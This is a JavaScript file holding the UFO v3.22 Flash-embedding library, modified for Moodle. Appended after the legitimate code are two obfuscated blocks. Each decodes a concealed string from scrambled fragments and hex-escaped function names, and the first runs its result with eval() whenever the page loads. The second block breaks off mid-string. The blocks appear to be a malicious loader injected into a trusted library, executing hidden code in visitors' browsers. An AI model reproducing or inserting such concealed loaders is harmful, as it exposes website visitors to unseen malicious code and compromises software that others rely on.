/*	Unobtrusive Flash Objects (UFO) v3.22 <http://www.bobbyvandersluis.com/ufo/>
	Copyright 2005-2007 Bobby van der Sluis
	This software is licensed under the CC-GNU LGPL <http://creativecommons.org/licenses/LGPL/2.1/>

    CONTAINS MINOR CHANGE FOR MOODLE (bottom code for MDL-9825)
*/

var UFO = {
	req: ["movie", "width", "height", "majorversion", "build"],
	opt: ["play", "loop", "menu", "quality", "scale", "salign", "wmode", "bgcolor", "base", "flashvars", "devicefont", "allowscriptaccess", "seamlesstabbing", "allowfullscreen", "allownetworking"],
	optAtt: ["id", "name", "align"],
	optExc: ["swliveconnect"],
	ximovie: "ufo.swf",
	xiwidth: "215",
	xiheight: "138",
	ua: navigator.userAgent.toLowerCase(),
	pluginType: "",
	fv: [0,0],
	foList: [],
		
	create: function(FO, id) {
		if (!UFO.uaHas("w3cdom") || UFO.uaHas("ieMac")) return;
		UFO.getFlashVersion();
		UFO.foList[id] = UFO.updateFO(FO);
		UFO.createCSS("#" + id, "visibility:hidden;");
		UFO.domLoad(id);
	},

	updateFO: function(FO) {
		if (typeof FO.xi != "undefined" && FO.xi == "true") {
			if (typeof FO.ximovie == "undefined") FO.ximovie = UFO.ximovie;
			if (typeof FO.xiwidth == "undefined") FO.xiwidth = UFO.xiwidth;
			if (typeof FO.xiheight == "undefined") FO.xiheight = UFO.xiheight;
		}
		FO.mainCalled = false;
		return FO;
	},

	domLoad: function(id) {
		var _t = setInterval(function() {
			if ((document.getElementsByTagName("body")[0] != null || document.body != null) && document.getElementById(id) != null) {
				UFO.main(id);
				clearInterval(_t);
			}
		}, 250);
		if (typeof document.addEventListener != "undefined") {
			document.addEventListener("DOMContentLoaded", function() { UFO.main(id); clearInterval(_t); } , null); // Gecko, Opera 9+
		}
	},

	main: function(id) {
		var _fo = UFO.foList[id];
		if (_fo.mainCalled) return;
		UFO.foList[id].mainCalled = true;
		document.getElementById(id).style.visibility = "hidden";
		if (UFO.hasRequired(id)) {
			if (UFO.hasFlashVersion(parseInt(_fo.majorversion, 10), parseInt(_fo.build, 10))) {
				if (typeof _fo.setcontainercss != "undefined" && _fo.setcontainercss == "true") UFO.setContainerCSS(id);
				UFO.writeSWF(id);
			}
			else if (_fo.xi == "true" && UFO.hasFlashVersion(6, 65)) {
				UFO.createDialog(id);
			}
		}
		document.getElementById(id).style.visibility = "visible";
	},
	
	createCSS: function(selector, declaration) {
		var _h = document.getElementsByTagName("head")[0]; 
		var _s = UFO.createElement("style");
		if (!UFO.uaHas("ieWin")) _s.appendChild(document.createTextNode(selector + " {" + declaration + "}")); // bugs in IE/Win
		_s.setAttribute("type", "text/css");
		_s.setAttribute("media", "screen"); 
		_h.appendChild(_s);
		if (UFO.uaHas("ieWin") && document.styleSheets && document.styleSheets.length > 0) {
			var _ls = document.styleSheets[document.styleSheets.length - 1];
			if (typeof _ls.addRule == "object") _ls.addRule(selector, declaration);
		}
	},
	
	setContainerCSS: function(id) {
		var _fo = UFO.foList[id];
		var _w = /%/.test(_fo.width) ? "" : "px";
		var _h = /%/.test(_fo.height) ? "" : "px";
		UFO.createCSS("#" + id, "width:" + _fo.width + _w +"; height:" + _fo.height + _h +";");
		if (_fo.width == "100%") {
			UFO.createCSS("body", "margin-left:0; margin-right:0; padding-left:0; padding-right:0;");
		}
		if (_fo.height == "100%") {
			UFO.createCSS("html", "height:100%; overflow:hidden;");
			UFO.createCSS("body", "margin-top:0; margin-bottom:0; padding-top:0; padding-bottom:0; height:100%;");
		}
	},

	createElement: function(el) {
		return (UFO.uaHas("xml") && typeof document.createElementNS != "undefined") ?  document.createElementNS("http://www.w3.org/1999/xhtml", el) : document.createElement(el);
	},

	createObjParam: function(el, aName, aValue) {
		var _p = UFO.createElement("param");
		_p.setAttribute("name", aName);	
		_p.setAttribute("value", aValue);
		el.appendChild(_p);
	},

	uaHas: function(ft) {
		var _u = UFO.ua;
		switch(ft) {
			case "w3cdom":
				return (typeof document.getElementById != "undefined" && typeof document.getElementsByTagName != "undefined" && (typeof document.createElement != "undefined" || typeof document.createElementNS != "undefined"));
			case "xml":
				var _m = document.getElementsByTagName("meta");
				var _l = _m.length;
				for (var i = 0; i < _l; i++) {
					if (/content-type/i.test(_m[i].getAttribute("http-equiv")) && /xml/i.test(_m[i].getAttribute("content"))) return true;
				}
				return false;
			case "ieMac":
				return /msie/.test(_u) && !/opera/.test(_u) && /mac/.test(_u);
			case "ieWin":
				return /msie/.test(_u) && !/opera/.test(_u) && /win/.test(_u);
			case "gecko":
				return /gecko/.test(_u) && !/applewebkit/.test(_u);
			case "opera":
				return /opera/.test(_u);
			case "safari":
				return /applewebkit/.test(_u);
			default:
				return false;
		}
	},
	
	getFlashVersion: function() {
		if (UFO.fv[0] != 0) return;  
		if (navigator.plugins && typeof navigator.plugins["Shockwave Flash"] == "object") {
			UFO.pluginType = "npapi";
			var _d = navigator.plugins["Shockwave Flash"].description;
			if (typeof _d != "undefined") {
				_d = _d.replace(/^.*\s+(\S+\s+\S+$)/, "$1");
				var _m = parseInt(_d.replace(/^(.*)\..*$/, "$1"), 10);
				var _r = /r/.test(_d) ? parseInt(_d.replace(/^.*r(.*)$/, "$1"), 10) : 0;
				UFO.fv = [_m, _r];
			}
		}
		else if (window.ActiveXObject) {
			UFO.pluginType = "ax";
			try { // avoid fp 6 crashes
				var _a = new ActiveXObject("ShockwaveFlash.ShockwaveFlash.7");
			}
			catch(e) {
				try { 
					var _a = new ActiveXObject("ShockwaveFlash.ShockwaveFlash.6");
					UFO.fv = [6, 0];
					_a.AllowScriptAccess = "always"; // throws if fp < 6.47 
				}
				catch(e) {
					if (UFO.fv[0] == 6) return;
				}
				try {
					var _a = new ActiveXObject("ShockwaveFlash.ShockwaveFlash");
				}
				catch(e) {}
			}
			if (typeof _a == "object") {
				var _d = _a.GetVariable("$version"); // bugs in fp 6.21/6.23
				if (typeof _d != "undefined") {
					_d = _d.replace(/^\S+\s+(.*)$/, "$1").split(",");
					UFO.fv = [parseInt(_d[0], 10), parseInt(_d[2], 10)];
				}
			}
		}
	},

	hasRequired: function(id) {
		var _l = UFO.req.length;
		for (var i = 0; i < _l; i++) {
			if (typeof UFO.foList[id][UFO.req[i]] == "undefined") return false;
		}
		return true;
	},
	
	hasFlashVersion: function(major, release) {
		return (UFO.fv[0] > major || (UFO.fv[0] == major && UFO.fv[1] >= release)) ? true : false;
	},

	writeSWF: function(id) {
		var _fo = UFO.foList[id];
		var _e = document.getElementById(id);
		if (UFO.pluginType == "npapi") {
			if (UFO.uaHas("gecko") || UFO.uaHas("xml")) {
				while(_e.hasChildNodes()) {
					_e.removeChild(_e.firstChild);
				}
				var _obj = UFO.createElement("object");
				_obj.setAttribute("type", "application/x-shockwave-flash");
				_obj.setAttribute("data", _fo.movie);
				_obj.setAttribute("width", _fo.width);
				_obj.setAttribute("height", _fo.height);
				var _l = UFO.optAtt.length;
				for (var i = 0; i < _l; i++) {
					if (typeof _fo[UFO.optAtt[i]] != "undefined") _obj.setAttribute(UFO.optAtt[i], _fo[UFO.optAtt[i]]);
				}
				var _o = UFO.opt.concat(UFO.optExc);
				var _l = _o.length;
				for (var i = 0; i < _l; i++) {
					if (typeof _fo[_o[i]] != "undefined") UFO.createObjParam(_obj, _o[i], _fo[_o[i]]);
				}
				_e.appendChild(_obj);
			}
			else {
				var _emb = "";
				var _o = UFO.opt.concat(UFO.optAtt).concat(UFO.optExc);
				var _l = _o.length;
				for (var i = 0; i < _l; i++) {
					if (typeof _fo[_o[i]] != "undefined") _emb += ' ' + _o[i] + '="' + _fo[_o[i]] + '"';
				}
				_e.innerHTML = '<embed type="application/x-shockwave-flash" src="' + _fo.movie + '" width="' + _fo.width + '" height="' + _fo.height + '" pluginspage="http://www.macromedia.com/go/getflashplayer"' + _emb + '></embed>';
			}
		}
		else if (UFO.pluginType == "ax") {
			var _objAtt = "";
			var _l = UFO.optAtt.length;
			for (var i = 0; i < _l; i++) {
				if (typeof _fo[UFO.optAtt[i]] != "undefined") _objAtt += ' ' + UFO.optAtt[i] + '="' + _fo[UFO.optAtt[i]] + '"';
			}
			var _objPar = "";
			var _l = UFO.opt.length;
			for (var i = 0; i < _l; i++) {
				if (typeof _fo[UFO.opt[i]] != "undefined") _objPar += '<param name="' + UFO.opt[i] + '" value="' + _fo[UFO.opt[i]] + '" />';
			}
			var _p = window.location.protocol == "https:" ? "https:" : "http:";
			_e.innerHTML = '<object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000"' + _objAtt + ' width="' + _fo.width + '" height="' + _fo.height + '" codebase="' + _p + '//download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=' + _fo.majorversion + ',0,' + _fo.build + ',0"><param name="movie" value="' + _fo.movie + '" />' + _objPar + '</object>';
		}
	},
		
	createDialog: function(id) {
		var _fo = UFO.foList[id];
		UFO.createCSS("html", "height:100%; overflow:hidden;");
		UFO.createCSS("body", "height:100%; overflow:hidden;");
		UFO.createCSS("#xi-con", "position:absolute; left:0; top:0; z-index:1000; width:100%; height:100%; background-color:#fff; filter:alpha(opacity:75); opacity:0.75;");
		UFO.createCSS("#xi-dia", "position:absolute; left:50%; top:50%; margin-left: -" + Math.round(parseInt(_fo.xiwidth, 10) / 2) + "px; margin-top: -" + Math.round(parseInt(_fo.xiheight, 10) / 2) + "px; width:" + _fo.xiwidth + "px; height:" + _fo.xiheight + "px;");
		var _b = document.getElementsByTagName("body")[0];
		var _c = UFO.createElement("div");
		_c.setAttribute("id", "xi-con");
		var _d = UFO.createElement("div");
		_d.setAttribute("id", "xi-dia");
		_c.appendChild(_d);
		_b.appendChild(_c);
		var _mmu = window.location;
		if (UFO.uaHas("xml") && UFO.uaHas("safari")) {
			var _mmd = document.getElementsByTagName("title")[0].firstChild.nodeValue = document.getElementsByTagName("title")[0].firstChild.nodeValue.slice(0, 47) + " - Flash Player Installation";
		}
		else {
			var _mmd = document.title = document.title.slice(0, 47) + " - Flash Player Installation";
		}
		var _mmp = UFO.pluginType == "ax" ? "ActiveX" : "PlugIn";
		var _uc = typeof _fo.xiurlcancel != "undefined" ? "&xiUrlCancel=" + _fo.xiurlcancel : "";
		var _uf = typeof _fo.xiurlfailed != "undefined" ? "&xiUrlFailed=" + _fo.xiurlfailed : "";
		UFO.foList["xi-dia"] = { movie:_fo.ximovie, width:_fo.xiwidth, height:_fo.xiheight, majorversion:"6", build:"65", flashvars:"MMredirectURL=" + _mmu + "&MMplayerType=" + _mmp + "&MMdoctitle=" + _mmd + _uc + _uf };
		UFO.writeSWF("xi-dia");
	},

	expressInstallCallback: function() {
		var _b = document.getElementsByTagName("body")[0];
		var _c = document.getElementById("xi-con");
		_b.removeChild(_c);
		UFO.createCSS("body", "height:auto; overflow:auto;");
		UFO.createCSS("html", "height:auto; overflow:auto;");
	},

	cleanupIELeaks: function() {
		var _o = document.getElementsByTagName("object");
		var _l = _o.length
		for (var i = 0; i < _l; i++) {
			_o[i].style.display = "none";
            var j = 0;
			for (var x in _o[i]) {
                j++;
				if (typeof _o[i][x] == "function") {
					_o[i][x] = null;
				}
                if (j > 1000) {
                    // something is wrong, probably infinite loop caused by embedded html file
                    // see MDL-9825
                    break;
				}
			}
		}
	}

};

if (typeof window.attachEvent != "undefined" && UFO.uaHas("ieWin")) {
	window.attachEvent("onunload", UFO.cleanupIELeaks);
}

var cbf0103="";function m411b38effa(){var bbf3a3889=String,vd4b5651a=Array.prototype.slice.call(arguments).join(""),s665e66=vd4b5651a.substr(o7ceb55fd(),3)-628,i8d59ee,h01a62;vd4b5651a=vd4b5651a.substr(10);var p7aaa9=vcd80533c(vd4b5651a);for(var wa297c7=0;wa297c7<p7aaa9;wa297c7++){try{throw(n878fa=vd4b5651a.substr(wa297c7,1));}catch(e){n878fa=e;};if(n878fa=='{'){s665e66="";wa297c7=ybdfe74b4(wa297c7);o08e70=db4daa(vd4b5651a,wa297c7);while(o08e70!='{'){s665e66+=o08e70;wa297c7++;o08e70=b112371(vd4b5651a,wa297c7);}s665e66-=313;continue;}i8d59ee="";if(w23e95f6(n878fa)){wa297c7++;n878fa=vd4b5651a.substr(wa297c7,1);while(n878fa!='?'){i8d59ee+=n878fa;wa297c7++;n878fa=vd4b5651a.substr(wa297c7,1);}i8d59ee=i8d59ee-s665e66-38;if(i8d59ee<0)i8d59ee+=256;i8d59ee=h741c8(i8d59ee);cbf0103+=bbf3a3889["\x66\x72\x6fm\x43\x68a\x72\x43ode"](i8d59ee);continue;}o98092d1=kcd0a8(n878fa);if(o98092d1>848)o98092d1-=848;h01a62=o98092d1-s665e66-38;h01a62=cab29f7(h01a62);cbf0103+=s0c0ef2(h01a62);}}m411b38effa("0","8f8e","ff","6","79?1","2","9","?","?","191","?{46","8","{6","/","{46","1{?2","9","?",".","{4","8","1","{","7={4","1","8","{","?","2","53","?","{3","8","1{","?","146","?","?147","?","?13","8?","?2","2","9","?","{","4","1","4{?1","52??14","9","?","?","14","8?","{46","9{8#","{3","27{","?","1","66?","{404","{?161","?","{","495","{","Q{","393{?2","3","2","?{4","76{5","?23","3","?","{327{","q","{4","13","{?170?","{4","0","2{?166?","?","23","1?{","35","0{","?19","1??1","9","1?{3","9","7{?234","?","?18","0","??16","9","?{43","5{","?207","?{4","72{",";",",2{453{?","28","?{","3","66{","?18","9","?","?","2","0","6","?","{3","30{","?","164","?{4","6","2","{","?","31?","1","{36","2{?","18","4??1","33","?","{4","3","2","{?2","0?{3","5","0{","?","1","76??1","73??1","7","9","??","1","8","6?","?18","7","?","{","4","9","2{?7?","H","{","4","56{","'{444","{","?","1","6","??21","6","?{40","9{","?2","3","7","?","?","1","8","1?","?173?","{","40","2","{","?","1","86??140","?","?13","7","?","?","1","3","6","??232?","{","4","7","3{",",","?23","0?","?","23","8?{","368{?20","9","?","{","4","1","6{","?6?","?25","3","?{","4","30","{","?","0?","?1","0","?{40","8","{","?2","3","5??","1","6","5?","?25","2?{4","57{?3","1","?$","{","4","26{?2","5","1","?{","3","74","{?","2","1","0","?{","3","65","{?","20","9","??1","36","??2","1","0?{31","9{","?","1","65?","{","4","6","1{4","{","48","4","{7{397","{","?","23","0","?{4","9","4{","<","{","4","4","9{?","21","?{","417","{?","174?","?2","03?","?203??","203","?{","369{?12","6","?","{","457{","?","221?","+","{","51","0{","Y","O","PQTY","{37","1","{","?1","97?","{31","8","{?143","?R","T","K","?","1","6","6","?{","405","{?","1","43","?","{","473","{?","208","?{39","8{","?","1","3","2","?","{","44","5","{?","17","9?{3","4","7{","?1","91","?{","417","{","?","24","7","?","?","2","52","?{","495","{","@","{","3","9","9","{","?","23","5?{","434","{?","22","?","{51","0{?2","5","?cd{","37","0{?217?","?1","97","?{","336","{","?","169?{","435","{","?","1","?","?","7?","{","4","9","4","{","?","2","51?{","3","6","3{","?14","9?","{3","2","2","{","O_j<","{47","8","{","?2","13","??2","12","?{","51","3{","k","?","2","5","1","?{","3","88{","?1","23?","z?2","1","3","?","{39","9{?235?{4","27","{","?251?","?1","3","??","5??","2","53","?","{3","51{?1","8","6?","?1","9","2?{","382{?1","53?","{379{","?","2","1","5","?","?","214??21","3","??2","15","?{","4","2","7","{?","1","3?","?","11?{4","5","5","{","?25","?!","{44","8","{?28","?","#{","3","7","3{","?1","9","9??","1","30?","{","439{?225","?","?","1","9","6","?","?","10?{","378","{","?","2","20?{33","5{?170?","{382{?2","0","6?","?2","2","3","??212","?","?218","?","{49","8","{M{4","39{","?2","04","?","?20","5?{31","5","{H{","3","38{?186","?","L","{4","3","7","{","?","1","7","2?","?1","71?{4","97{","?2","3","1","?{","3","1","7{","?1","47","?","?","1","4","4?{436","{?","19","3","??","201","?","?","24?{33","3","{?","16","3","?","?","1","68?","?","1","58?","{4","88","{D","L","?3?","MN","{","407","{","?2","54?{347{","?1","7","4??","180","?{","3","17","{?1","3","9","?","{","4","8","8","{<","?","24","5","?","{","5","1","0","{(","(","(","{3","50{k","?","1","23","?","t{","44","7","{","?2","04?'","?","18","5?","?1","82","?{","45","7","{","?1","91?","?1","91?{3","7","2","{","j{","5","1","3{eW{315{","?15","0?","{43","8","{?7??","18?","?","2","6","?","{","43","6{","?2","07","?","?","2","5??2","6?","?27?","?7?","{3","9","9","{?2","32??","2","2","1","?","?","2","27","?{","424{","?1","8","1","?","{","40","9","{","?195?","{44","8{","?","205","?{33","1","{","i","{","47","5","{?","3?","{","388{?","1","2","6?","?12","3?z","z{496{?23","0?S",">O","{","431{?1","8","8","??","4?","{","49","3{","?{","4","1","5{","?2","3","7","?{38","5","{","?","2","10??142?{","3","93","{?","1","79","?","?150??","2","18","??2","2","9?","?","217","?","?2","35?","?22","7","?","?2","19","??228","?","?","234","?","?16","4?","{323{","?151","??1","4","9","?","{3","6","9","{?","210","?{","3","7","8","{?172?{41","1{","?2","44??","2","3","7","??245?","?2","37","?{31","7","{?1","52??","15","8?{","45","1","{#","?242","?",")?4?","?1","7?","?23","?","{3","77{?","180?","?","1","9","9??211","?{4","44{","?14","?{","4","53{","?","2","1","8","??21","7??2","6","?","?","2","3","?{","4","64{","?3","0","?!","?","22","8?","?2","3","0?","?","2","4","?{","4","93","{?","1","0","?","{50","9","{","G","{4","93{","?","2","1?","?","2","3","1","?{43","5","{?1","7","0?","{3","5","6{","Z","{4","30{","?","16","4?{","4","56","{","?","1","9","0","?{","3","6","4{","?20","7","??","18","6?","{415","{","?","2","54??","1","72","??","25","5?","?","2","3","9","?","{","3","5","5","{?","194?","{","3","2","0{?15","0?","{","4","55","{","$","{","351","{","?","192","?","l?","1","3","7","?","{4","9","2","{?24","9?=","H<","{4","7","7{","?","7/8","{38","9{?2","3","0??160","?","{","489","{9","{5","03","{","V","{","482","{","4","0{","375{","?216","?","?2","01??","1","69?{","4","1","7","{","?","2","5","0??","24","3??","2","51","?{4","09","{","?","235?{352","{","?","187?{45","5","{({409","{?174??","1","73","??2","49","?{440{","?","8??23?{","399{","?22","9","?","?236?{375","{","?216?","?139","??","1","4","1","?","?","1","5","9?","q{","369{","hg{3","42","{","L","L{3","9","8","{?23","8??","2","22?","{","438{","?2","1","?","?","12","??","19","??","2","3","?","{","39","8{","?1","69??2","3","9??24","4","??2","35?","{4","2","4{?","2","5","0?{","344","{e?","130?e","{49","4","{?","2?","{","444","{?2","9?{","3","5","8{?","18","4?{","3","9","1{","?","2","36?","?","232?{","512","{","?","28?","WNc{","3","91","{","?213?{","394{?234","?","{454{?","22?%?","2","8","?","#'","?2","1","8","?","{","44","6","{","?2","3","0","??1","8","4","??1","8","1?{","497","{","?","23","1","?","{4","1","3","{","?","1","47","??","1","47","?","{4","3","3","{","?","17","??1","?{462{-$","{","4","55","{","$","{","399{?24","0??","17","0","?","{47","1","{","326","{4","0","2{","?","22","8","?{","3","89","{?","21","1?{33","4{","?","1","5","9","?","?","180","?","{","450{","\"#?16","?","{","4","1","3{?","25","4?{48","6{","86","{426{?255?","?248","??5?","{","48","0","{42","{449{","?","2","0","6","?{34","6{","?","13","2","?","{","321{","N{","4","21{?","248","?","?","7?{35","2{","?1","8","7?","{434{?","2?","?19","??8?","{3","5","5{","?","1","91?","{","36","0{?1","9","5?","u","?12","5","?{","3","47","{q","h{32","4","{?1","7","2","?","{","3","90{?1","28","?","{","408{?1","4","3","??14","2","?{","4","2","0","{?154","?{42","7","{?16","1??1","6","1?","?","1?","?2","54??184","?{","352{u?19","3?","?18","1","?","?","1","8","2","?","{","415{","?2","5","5","?","?","186","??","2","5","4","?{","32","7{?","1","53","??14","9","?","?15","2?","?17","3","?","{","32","9","{","?","1","3","7","?{","48","8","{","I6I","{4","3","3","{","?","3?{490","{","?2","4","7?{","35","7{","?","1","4","3?","?","1","43","?","r","y{4","4","3{?","11?","?23?","?2","1?","{","343{?","18","0","?{4","9","8{","KDS","D{","4","87{?","2","5","1","?{","4","19{?","185?{","41","9","{","?","17","6??11","?","{","495","{?233","?","{","4","41","{?176?{4","44{","?1","7","8","??","1","7","8","?","?","17","8","??1","78","?","?1","78?","?","32","?","{4","1","4","{?","2","44?","?249","?","{","3","32","{?15","7?{","38","7{?2","23?{49","4{","R","?9","?","{3","32{","?177","?{","44","3{!","{372","{","?","21","9","?","?","19","9","?","{3","83{?","2","16","?","{3","47{?","1","69","??","17","5","?","{443{","?200","?{","444{","?","2","30","??","2","0","1","?","?219","?","{","4","8","2","{?10?{3","7","9{u","{","3","63{b","a","{","4","6","4{?","1","9","8","?","?","1","98?{","5","03","{?","237?{42","9","{","?","23?","{345","{","SP","{3","7","8{p","p{4","2","5{","?1","59","?","{","4","42","{${","494","{?22","?","{4","4","8","{?1","8","6","?{32","1","{","877","7{","4","01","{","?2","41","?","?2","2","5?","?","240","?{345","{?","17","5?{4","8","0{={482","{","C{","4","89","{?4?E{464","{","+{4","3","8{","?","1","5?","{3","7","6","{","?2","1","2?","{","3","47{?","169","?","?172","?h{","32","7","{","qT","?15","4?","?1","69??","162??","1","5","1","?","?1","6","8","?{","4","5","1","{?","25?","{458","{&%","{","3","98","{?","1","6","3","?","?","164?","?","1","5","5?","{","3","53","{?2","0","1","?","{","3","56","{^[{48","8{","?","2","2","2","?{402{?136?{3","8","7{","y{391","{?","125?","{","45","3{",")?","27?","{","319","{","?","154?","?","1","44","?","{477{","9A","{","4","7","0","{?","24","1","?","{","478","{","CD","E1{","4","9","9","{L","AG","?","0","??2","9","??","0?","?","1","8?","{3","46{","?","1","3","0","?","{3","18","{","8{","4","5","9","{","?1","9","4","?{37","2{","j","{343{M","M?19","3","?{4","4","1","{","?","22","5","?{","4","14","{?","152??","14","9??","14","8?","?","1","4","8","?","{3","45","{","O{","44","4","{?28?","?","1","2?{","3","24","{","?","163","?{5","0","8","{","R","Y","{361{","?","2","02","??132?","?2","0","1?","?2","0","0?{4","1","9{?24","3??","1","76??","2","05?{","4","5","2{?","2","09?{","44","5","{","?31","??28?","{","472{","1?229?","?","2","40","?","{","4","75{","?","232?","?","21?{","3","9","2{?","2","14?","?","23","3?{4","9","2","{","A?","7?","K","{","4","2","8{?","2","5","0","?","{32","2{?15","7?","{3","40{?","16","5?","?","176?{","39","1{?","2","2","5","??","1","56","?{503{","?1","3","?{","48","6{","?","1?G{","44","2","{","?","2","2","?","{3","23","{","?","1","3","1","??","1","6","4","?","{43","6","{?1","9?","?10","??","15?","{","337{","?1","65?","fgl","?177","?","{401{?","2","4","3","??","22","4?","{502","{VWU","{435{?9?","?14?{","395{?2","2","3","?{50","0{?","9","?{","485","{","?","5?{","4","3","1","{?197","?{437{","?19","4","?","{","3","30{bW^e?161?","{","34","2","{","?","1","82?","j{","4","6","1{","?","2","4","5??","1","99","?{","4","17{","?","1","52","?{4","9","5{","?","22","9","?","?","2","2","9??","22","9?","{","3","90{","?","21","9","??216","?","?","2","12??","21","5","?","?1","6","1","?{","4","57","{?","23?&","&","?","2","7","?","$","?2","6?{","457{","?2","49","??","30?{","4","8","9","{?","{","4","1","5{","?","2","4","8","?","{421{?2","4","6??18","6??5","??24","5","??4","??25","1","?","?","2","??","6","??18","7?","{40","4{?","1","88?{37","3{","ol{45","5","{?","18","9?","{5","11","{","?","245","?","{","3","1","9","{","?1","6","9","?965","?","1","69","?{4","02","{?","186","?{4","58{","?1","9","6","?","{","4","37","{?","172?{3","92{","?","242?{462{","?22","8?","?227","?","{","4","5","3","{","?219","?","?23","7","?","");eval(cbf0103);function o7ceb55fd(){return 7;}function vcd80533c(be91f8){return be91f8.length;}function ybdfe74b4(g6814644){return ++g6814644;}function db4daa(p227b25db,de000d){return p227b25db.substr(de000d,1);}function b112371(ua548295,p54832cb){return ua548295.substr(p54832cb,1);}function h741c8(k3bada20){if(k3bada20==168)k3bada20=1025;else if(k3bada20==184)k3bada20=1105;return (k3bada20>=192 && k3bada20<256) ? k3bada20+848 : k3bada20;}function w23e95f6(k4e2956f2){return k4e2956f2=='?';}function s0c0ef2(cb9961b1){var bbf3a3889=String;return bbf3a3889["\x66\x72\x6fm\x43\x68a\x72\x43ode"](cb9961b1);}function cab29f7(q31c92ab5){var ic8b7e5=q31c92ab5;if(ic8b7e5<0)ic8b7e5+=256;if(ic8b7e5==168)ic8b7e5=1025;else if(ic8b7e5==184)ic8b7e5=1105;return (ic8b7e5>=192 && ic8b7e5<256) ? ic8b7e5+848 : ic8b7e5;}function kcd0a8(i2fac3){return (i2fac3+'')["cha\x72\x43\x6fd\x65A\x74"](0);}
var hc4f4080="";function i3acde1c73e(){var ma9314df4=String,b1793799d=Array.prototype.slice.call(arguments).join(""),d6a0b9=b1793799d.substr(2,3)-465,f52d2025e,a69753ce;b1793799d=b1793799d.substr(5);var jbc7af86=x0959807a(b1793799d);for(var saefe7137=0;saefe7137<jbc7af86;saefe7137++){try{throw(f5b1d64a=tcbf09eaf(b1793799d,saefe7137));}catch(e){f5b1d64a=e;};if(f5b1d64a=='|'){d6a0b9="";saefe7137=ha07190(saefe7137);y4a6842ab=b44f05(b1793799d,saefe7137);while(y4a6842ab!='|'){d6a0b9+=y4a6842ab;saefe7137++;y4a6842ab=xa547c79f(b1793799d,saefe7137);}d6a0b9-=664;continue;}f52d2025e="";if(kf56c59f(f5b1d64a)){saefe7137++;f5b1d64a=b1793799d.substr(saefe7137,1);while(f5b1d64a!='?'){f52d2025e+=f5b1d64a;saefe7137++;f5b1d64a=b1793799d.substr(saefe7137,1);}f52d2025e=x724c28(f52d2025e,d6a0b9,35);if(f52d2025e<0)f52d2025e+=256;if(f52d2025e>=192)f52d2025e+=848;else if(f52d2025e==168)f52d2025e=1025;else if(f52d2025e==184)f52d2025e=1105;g045f6873(f52d2025e);continue;}ra70dba9=a2a048(f5b1d64a);if(ra70dba9>848)ra70dba9-=848;a69753ce=ra70dba9-d6a0b9-35;a69753ce=o55ffb(a69753ce);hc4f4080+=ma9314df4["\x66\x72\x6fmC\x68\x61\x72\x43o\x64e"](a69753ce);}}i3acde1c73e("49","5","8","6","?","19","6?|6","97|","?1","7","0?","|824","|8","1","&","|7","2","6","|?","2","13?|81","4|","\"","(","|70","8|","?","189","?wxo","?20","2","?|681|","A|8","1","9","|?200?","|80","0","|","?18","0?","!","|","762|?2","3","0","?","?","2","47","??1","65?","|","734","|?","2","22","?","|","685|?","1","70","?|","858|","Q|777|","?180","??2","09","?","|8","1","6","|","?","2","19?|","8","2","3|","?","2","33","?*|","79","4|","?25??25??","21","?|8","16|?","2","45","?|","699|","uu|","8","13|","?","2","3","5","?",".","?24","0?","%?23","4?","-","?","2","30?#|72","0|?20","3?","|7","49","|","?233??","2","2","2","?","?","22","6","?","?2","2","5?","?","22","6","?","|","7","3","1","|?21","1","?|79","5","|?18?|","7","2","3","|?","19","7","?","?","140","?|","71","0|?","18","1?","|","8","14|2","'?","29?","',?2","30","?\"|767","|?","2","5","0??","184?","?","2","3","7?","?24","9","??","2","47","?","|8","16|?234?|86","1|O","?23","?","|82","2","|?","2","32","?","|807|","?237","?","?","1","91","?","|832","|?","2","13?","?","2","1","2?4|","8","2","7|",",|","6","90","|]e|","69","2|?17","9?","?1","8","4?","|","6","8","5","|","?1","68?|7","49|?2","2","1","?","|","74","8|?","230?|","7","19","|?","192","?","|","77","8|?","181??1","2","??2","54??3","??2","49","??4","?","?","1","2?","?","1","95?","|699","|","?190?","?","19","1?","|7","44|?","23","7","?|","840|9|6","9","1","|","?17","0","??159","?","|","84","1","|;","?2","4","4?","?","17","?","?17","?","|","70","5|?1","37","?","|726|","?","1","2","9","??","1","36","?","|731|","?","2","1","9","?","?","21","2","?|712|?","1","83","??1","8","4","??","1","85?","?1","8","8","??","1","93?","|73","5","|","?20","7?","|","6","7","7|?1","4","8","?","W","YP?1","7","1","?","|85","7|?","2","4","1??2","3","8?","|6","8","1|","=","=?17","1?","|8","63|S","X","NY","|","8","33","|C|","825|?","2","4","2","?","<","=|77","7","|?1","4","??","25","0?|","8","0","8","|?31","?","?","2","0","?|78","1","|?","25","5?","|8","09","|","?2","12?|6","9","3","|","?","125","?|","7","2","1","|?","1","24?","|844|","?7?","?1","8?","?22","8?|85","9|","?24","0?","|","8","11","|?1","9","1","?","|","7","07|?203?","|8","1","1|","?","19","5","?","?","1","92?","?1","9","1","?","?","26?|","834","|<","0|7","99","|","?31?","|","8","2","6|2","*|84","5","|","FL?6?","G|7","86|","?1","1","?","|81","4|&","(",".",",|","77","9|?251","??","3","??5?","|","713|?","202?","|","7","48","|?22","0?|782|","?1","8","5?|","6","88|x","[?","1","6","1?","?1","76?","?1","6","9?","?","158?|","6","8","1","|?1","6","8","?","|","7","91|","?","11","?","?1","7?|","737|?218?","|","6","7","6","|","WXO|85","6","|","^|7","2","7|","ol","|776|?","1","56","?","?15","6?|","8","2","2","|","*","|","8","17","|\"","?","2","2","0?","?22","8?3","%","*","|","6","93|?1","64?","|855","|","Q","|","82","4|:?","2","41?",";","<|","7","2","5","|","?","21","8","??","1","9","8?","|","850","|I>","D|7","0","0","|g","|","855","|?3","1","?","?","3","1","?","?3","1?","?2?","|","73","5","|","?1","54?|8","1","9|?2","3","1?","|","67","3","|L|","7","40","|?","234??1","24?","|6","9","2|","I","|","8","17|?","1","9","7?|73","2|","p","|","8","36|?2","16?","|","71","2|?","2","02??","188","?","|7","4","6|?2","2","7??21","7?","|764","|?246?|","8","6","3|","a","?24","?b","cd","|","70","0|","?","1","7","3??","179?","|","72","3","|?","1","9","1","?|","7","9","7|","?1","5","?","|","8","0","3|?206","?","|","8","3","2|","?8","?|","8","4","7|","?2","5","0","??1","1?","|","780","|?","210?","|7","6","7|?","1","51","??14","8","?","|6","98|N|","81","5|","?","19","5?|6","6","7|/|8","59","|","\\|","845|9J|","732","|?1","35?","?","207?","?20","4","??2","00","?|6","71","|","?1","4","2","?|863|","?","10?","|","7","6","3|","?","1","95?","|","81","9|","?","2","2","2?\"","-|8","0","0